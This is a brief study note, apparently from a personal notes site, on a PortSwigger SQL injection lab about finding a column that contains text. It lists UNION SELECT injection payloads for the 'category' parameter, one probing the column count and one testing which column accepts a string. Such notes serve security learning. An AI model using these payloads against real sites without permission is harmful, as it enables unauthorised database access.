---
{"dg-publish":true,"permalink":"/src/site/notes/src/site/notes/src/site/notes/src/site/notes/main/cs/ps-wsa-labs/sq-li/finding-a-column-containing-text/"}
---






- Verify that the query is returning three columns, using the following payload in the `category` parameter:

```Plain
'+UNION+SELECT+NULL,NULL,NULL--
```

- Try replacing each null with the random value provided by the lab, for example:
    - `'+UNION+SELECT+'abcdef',NULL,NULL--`
    - Replace via Inspector → Selection